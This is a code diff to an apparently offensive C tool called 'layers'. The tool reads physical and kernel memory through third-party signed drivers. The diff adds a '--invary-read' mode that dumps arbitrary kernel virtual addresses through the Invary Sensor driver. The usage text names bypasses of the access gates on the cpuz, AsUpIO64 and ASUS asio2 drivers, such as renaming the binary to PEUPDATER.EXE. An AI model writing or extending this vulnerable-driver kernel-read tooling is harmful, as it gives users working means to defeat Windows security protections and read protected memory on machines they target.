@@ -1117,6 +1117,7 @@ static void usage(void) {
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
+    printf("  layers --invary-read --va <hex> --size <n> [--invary-device <path>] (kernel-VA bytes via Invary)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
     printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
     printf("  note: --reader asio2 requires bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0 gate bypass)\n");
@@ -1127,7 +1128,7 @@ int main(int argc, char **argv) {
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0, expect_first = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, do_invary_read = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
@@ -1149,12 +1150,33 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
         else if (strcmp(argv[i], "--kprl") == 0) use_kprl = 1;
         else if (strcmp(argv[i], "--invary") == 0) use_invary = 1;
+        else if (strcmp(argv[i], "--invary-read") == 0) do_invary_read = 1;
         else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
         else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
         else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) { usage(); return 0; }
     }
     if (do_selftest) return selftest_mock();
+    if (do_invary_read) {
+        if (!invary_open(invary_device)) {
+            printf("[ERR] Invary device open failed (need invarysensor.sys loaded)\n");
+            return 3;
+        }
+        if (!have_va || size == 0) { printf("[ERR] --invary-read needs --va and --size\n"); return 6; }
+        uint8_t *b = (uint8_t *)calloc(1, size);
+        if (!b) return 6;
+        if (!invary_kread(NULL, va, b, size)) {
+            printf("[ERR] invary kernel-VA read VA=0x%llX size=%u failed\n",
+                   (unsigned long long)va, size);
+            free(b);
+            return 5;
+        }
+        printf("[OK] invary kernel-VA read VA=0x%llX size=%u:\n", (unsigned long long)va, size);
+        for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
+        printf("\nVERDICT=PASS\n");
+        free(b);
+        return 0;
+    }
     if (do_ranges) {
         mb_range rs[256];
         int n = mb_phys_ranges_from_registry(rs, 256);
